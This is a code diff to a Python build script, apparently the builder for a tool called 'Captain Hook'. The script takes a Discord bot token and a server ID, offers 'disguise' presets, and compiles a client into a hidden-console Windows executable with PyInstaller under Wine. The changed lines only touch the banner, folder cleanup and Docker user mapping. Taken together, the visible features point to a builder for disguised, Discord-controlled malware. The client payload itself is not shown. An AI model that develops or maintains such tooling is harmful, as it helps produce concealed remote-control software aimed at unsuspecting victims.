@@ -71,21 +71,23 @@ DISGUISES = {
 def display_banner():
     banner = """
 [bold cyan]
-   ______ ___  ____  _________    _____   __
-  / ____//   ||  _ \/_  __/   |  /  _/ | / /
- / /    / /| || |_) |/ / / /| |  / //  |/ / 
-/ /___ / ___ ||  __/ / // ___ | / // /|  /  
-\____//_/  |_||_|   /_//_/  |_||___/_/ |_/   
-                                            
-    __  ______  ____  __ __                 
-   / / / / __ \/ __ \/ //_/                 
-  / /_/ / / / / / / / ,<                    
- / __  / /_/ / /_/ / /| |                   
-/_/ /_/\____/\____/_/ |_|                   
+  ██████╗ █████╗ ██████╗ ████████╗ █████╗ ██╗███╗   ██╗
+ ██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██║████╗  ██║
+ ██║     ███████║██████╔╝   ██║   ███████║██║██╔██╗ ██║
+ ██║     ██╔══██║██╔═══╝    ██║   ██╔══██║██║██║╚██╗██║
+ ╚██████╗██║  ██║██║        ██║   ██║  ██║██║██║ ╚████║
+  ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
+ 
+  ██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗
+  ██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝
+  ███████║██║   ██║██║   ██║█████╔╝ 
+  ██╔══██║██║   ██║██║   ██║██╔═██╗ 
+  ██║  ██║╚██████╔╝╚██████╔╝██║  ██╗
+  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
 [/bold cyan]
-[bold white]          - Architect Builder v3.1 - [/bold white]
+[bold white]               - Architect Builder v3.1 - [/bold white]
     """
-    console.print(Panel(banner, border_style="cyan", padding=(1, 1)))
+    console.print(Panel(Align.center(banner), border_style="cyan", padding=(1, 1)))
 
 def get_config():
     token = Prompt.ask("[bold yellow]Discord Bot Token[/bold yellow]")
@@ -212,16 +214,19 @@ def build(token, guild_id, preset_name, disguise_name):
     ) as progress:
         # Step 1: Source Preparation
         progress.add_task(description="Preparing source files...", total=None)
-        if os.path.exists("build_staging"):
-            try:
-                shutil.rmtree("build_staging")
-            except PermissionError:
-                console.print("\n[bold red]Permission Error:[/bold red] Could not remove 'build_staging'.")
-                console.print("[yellow]Hint:[/yellow] This usually happens if you built with Docker. Try: [bold]sudo rm -rf build_staging[/bold]")
-                return
-            except Exception as e:
-                console.print(f"\n[bold red]Error cleaning build_staging:[/bold red] {e}")
-                return
+        
+        # Pre-clean known problematic folders
+        for folder in ["build_staging", "build"]:
+            if os.path.exists(folder):
+                try:
+                    shutil.rmtree(folder)
+                except PermissionError:
+                    console.print(f"\n[bold red]Permission Error:[/bold red] Could not remove '{folder}'.")
+                    console.print(f"[yellow]Hint:[/yellow] Locked by Docker. Try: [bold]sudo rm -rf {folder}[/bold]")
+                    return
+                except Exception as e:
+                    console.print(f"\n[bold red]Error cleaning {folder}:[/bold red] {e}")
+                    return
         
         # Robust project root detection
         # 1. Try current working directory
@@ -345,16 +350,23 @@ def build(token, guild_id, preset_name, disguise_name):
     
     # Generate docker-compose.override.yml for Docker builds
     try:
+        uid = os.getuid() if hasattr(os, 'getuid') else 1000
+        gid = os.getgid() if hasattr(os, 'getgid') else 1000
         docker_cmd = f"wine python.exe -m PyInstaller --onefile {noconsole} --name CaptainHook --paths=/src/build_staging build_staging/src/client/main.py"
         override_content = f"""version: '2.4'
 services:
   windows-builder:
     container_name: ch_win_builder
+    user: "{uid}:{gid}"
+    environment:
+      - CURRENT_UID={uid}
+      - CURRENT_GID={gid}
+      - WINEPREFIX=/tmp/wine
     command: {docker_cmd}
 """
         with open("docker-compose.override.yml", "w") as f:
             f.write(override_content)
-        console.print("[dim]Generated docker-compose.override.yml for tailored Docker build.[/dim]")
+        console.print("[dim]Generated docker-compose.override.yml with host-user mapping.[/dim]")
     except Exception as e:
         console.print(f"[bold red]Warning:[/bold red] Could not generate docker-compose.override.yml: {e}")
 
